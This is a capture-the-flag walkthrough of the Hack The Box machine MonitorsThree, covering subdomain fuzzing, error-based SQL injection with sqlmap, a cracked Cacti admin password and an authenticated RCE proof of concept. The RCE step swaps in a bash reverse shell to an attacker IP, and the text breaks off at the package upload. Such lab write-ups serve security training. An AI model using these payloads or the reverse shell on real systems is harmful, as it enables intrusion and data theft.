---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: subdomainenumeration cacti mysql sqli sqlinjection error-based rce remotecodeexecution
---

<br />

![1](../../../assets/images/MonitorsThree/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Introduction:

<br />



<br />

# Enumeration:

<br />

We start by running the typical `nmap` scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.11.30 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-26 18:25 CEST
Nmap scan report for 10.10.11.30
Host is up (0.045s latency).
Not shown: 65447 closed tcp ports (reset), 86 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.61 seconds
```

<br />

Open Ports:

`Port 22` -> ssh 

`Port 80` -> http

<br />

# Http Enumeration: -> Port 80

<br />

To access the main website, first we need to add `monitorsthree.htb` to our `/etc/hosts`:

<br />

```bash
❯ echo '10.10.11.30 monitorsthree.htb' >> /etc/hosts
```

<br />

Now we can visit the page:

<br />

![2](../../../assets/images/MonitorsThree/2.png)

<br />

It has two functionalities available.

A login panel at `/login.php`:

<br />

![3](../../../assets/images/MonitorsThree/3.png)

<br />

And the typical "Forgot Password" page at `/forgot_password.php`:

<br />

![4](../../../assets/images/MonitorsThree/4.png)

<br />

## Subdomain Fuzzing:

<br />

Before testing these functionalities, we are going to perform some `fuzzing` on the main `domain`:

<br />

```bash
❯ ffuf -u http://monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 20 -fs 13560

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsthree.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13560
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 44ms]
:: Progress: [4989/4989] :: Job [1/1] :: 432 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

<br />

Perfect! We have discovered a new `subdomain`!

<br />

### cacti.monitorsthree.htb:

<br />

Let's add it to our `/etc/hosts`:

<br />

```bash
10.10.11.30 monitorsthree.htb cacti.monitorsthree.htb
```

<br />

Once the `subdomain` has been added, we can visit the page:

<br />

![5](../../../assets/images/MonitorsThree/5.png)

<br />

Apparently, this page is hosting a `Cacti` instance running version `1.2.26`.

There is a known `Authenticated RCE` for this version, but since we don't have valid `credentials` at the moment, we will continue with the enumeration.

<br />

## Testing functionalities:

<br />

It's time to start testing the `functionalities` that we have seen before.

<br />

### login.php:

<br />

We attempt to log in using `default` credentials, but without success:

<br />

![6](../../../assets/images/MonitorsThree/6.png)

<br />

### forgot_password.php:

<br />

This functionality has two types of responses.

<br />

- 1.- Successful:

If we enter a valid username like `admin`, we will see the following message:

<br />

![8](../../../assets/images/MonitorsThree/8.png)

<br />

- 2.- Error:

But if the username is invalid, the application returns the following `error`:

<br />

![7](../../../assets/images/MonitorsThree/7.png)

<br />

## Error-Based SQL Injection (MySQL):

<br />

We can try inserting a single quote `"'"` into the input field and observe what happens:

<br />

![9](../../../assets/images/MonitorsThree/9.png)

<br />

This type of error is common in applications vulnerable to `SQL Injection`.

To continue testing this vulnerability, we will check if the payload `"anyusername' or 1=1-- -"` works:

<br />

![10](../../../assets/images/MonitorsThree/10.png)

<br />

Yes! Our query was injected successfully!

<br />

## Automated Exploitation with sqlmap:

<br />

Now we are going to automate the exploitation with `sqlmap`, because `error-based` injections can take a lot of time if we decide to exploit them manually.

To do this, we will capture and save the request to a file using `Burp Suite`:

<br />

![11](../../../assets/images/MonitorsThree/11.png)

<br />

At this point, we can feed the file to `sqlmap` to detect the injection:

<br />

```bash
❯ sqlmap -r request --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.12#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:40:15 /2025-04-26/

[20:40:15] [INFO] parsing HTTP request from 'request'
[20:40:16] [INFO] resuming back-end DBMS 'mysql' 
[20:40:16] [INFO] testing connection to the target URL
got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: username=admin';SELECT SLEEP(5)#
---
[20:40:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:40:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/monitorsthree.htb'

[*] ending @ 20:40:16 /2025-04-26/
```

<br />

We continue enumerating the available `databases`:

<br />

```bash
❯ sqlmap -r request --dbs --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.12#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:49:12 /2025-04-26/

[20:49:12] [INFO] parsing HTTP request from 'request'
[20:49:13] [INFO] resuming back-end DBMS 'mysql' 
[20:49:13] [INFO] testing connection to the target URL
got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: username=admin';SELECT SLEEP(5)#
---
[20:49:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

available databases [2]:
[*] information_schema
[*] monitorsthree_db

[20:49:13] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/monitorsthree.htb'

[*] ending @ 20:49:13 /2025-04-26/
```

<br />

There are two databases.

The most interesting one is `monitorsthree_db`, so let's enumerate its tables:

<br />

```bash
❯ sqlmap -r request -D monitorsthree_db --tables --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.12#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:52:28 /2025-04-26/

[20:52:28] [INFO] parsing HTTP request from 'request'
[20:52:29] [INFO] resuming back-end DBMS 'mysql' 
[20:52:29] [INFO] testing connection to the target URL
got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: username=admin';SELECT SLEEP(5)#
---
[20:52:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...[snip]...
[20:58:38] [INFO] retrieved: users
Database: monitorsthree_db
[6 tables]
+---------------+
| changelog     |
| customers     |
| invoice_tasks |
| invoices      |
| tasks         |
| users         |
+---------------+

[21:01:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/monitorsthree.htb'

[*] ending @ 21:01:19 /2025-04-26/
```

<br />

We have six tables. 

We will dump the `users` one:

<br />

```bash

```

<br />

There are four `users` with their own hashes.

<br />

## Cracking Hashes:

<br />

If we enter these hashes into  [Crackstation](https://crackstation.net/), we are able to crack one of them:

<br />



<br />

This password works for the Cacti login -> `admin/greencacti2001`

<br />

![11](../../../assets/images/MonitorsThree/12.png)

<br />

## Cacti Authenticated RCE:

<br />

If we remember, before exploiting the `SQL Injection`, we had found an `RCE` vulnerability in this Cacti version.

Afther further research, we found a very useful [POC](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) in Cacti's security advisories on GitHub.

<br />

```php
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php phpinfo(); ?>";
$keypair = openssl_pkey_new(); 
$public_key = openssl_pkey_get_details($keypair)["key"]; 
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>
```

<br />

As we can see, the `POC` is a php script that is going to create a `.xml.gz` file with malicious `php` code inside.

Once the file is created, we need to `upload` it to Cacti in the "import package" section and access the upload path to `run` the command.

Before run the script, we're going to replace the "$filedata" content with a bash reverse shell:

<br />

```php
$filedata = "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.22/443 0>&1\"'); ?>")
```

<br />

Then, we run the php `exploit` to create the file:

<br />

```bash
❯ php exploit.php
❯ ls
 exploit.php   test.xml.gz
```

<br />

File created successfully!

<br />

Now we can get back to the Cacti admin panel and go to `"Import/Export"` -> `"Import Packages"` to select the file:

<br />



<br />

And we upload it:

<br />



<br />

